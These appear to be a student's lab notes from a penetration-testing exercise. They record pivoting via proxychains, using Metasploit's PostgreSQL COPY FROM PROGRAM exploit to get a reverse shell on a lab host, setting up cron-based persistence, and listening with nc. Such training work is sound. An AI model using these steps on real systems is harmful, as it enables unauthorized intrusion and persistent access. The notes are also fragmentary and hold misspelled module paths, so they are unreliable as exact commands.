the two different ways to do this within Metasploit, you can run the search command to just called search and then you throw in the service and the version uh or on Cali directly from the terminal called Search sploit
utulize metasploit to get on soc4. 
Proxychains is used because you dont have to drop anything on the victim because ssh is already built in.
So we open up Metasploit through proxy chains.

Checked to see if it was vulnerable to SSH enumeration.

landed inside exploit module within Metasploit while it's proxied. 
say use zero, it's going to set set me up to utilize this module here.

(ATK)(msf6) search postgresql [1:45:23][Day 11]
Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0

(ATK)(msf6) search postgresql 9.6.0 (start from 9.6.0 and back space one character each time to see what you find out)

(ATK)(msf6) search postgresql 9.6

(ATK)(msf6) search postgresql 9. [I USED 0 ON THIS]

(ATK)(msf6) search postgresql 9

use number that has expliot module (it vaires but i used the one ending in "cmd_excec")

use exploit modules as much as possible.
LHOST comming back through our WAN


[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]


(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]


[HARD STOP found out that you need creds for this route ]

Config start around [1:48] [DAY 11]

(CALI) searchsploit postgresql (find version) 

(ATK)(msf6) search postgresql

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.102 [3:29][DAY 11]

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [check config]

(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [3:30][DAY 11]

run id

break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)

set up python3 shortest in cron tabs

he set up another listner over port 12225 (VIC 2 Persisitence)

catch user persistence shell ON VIC2 [[14:02]]DAY 12
nc -lvp 55555

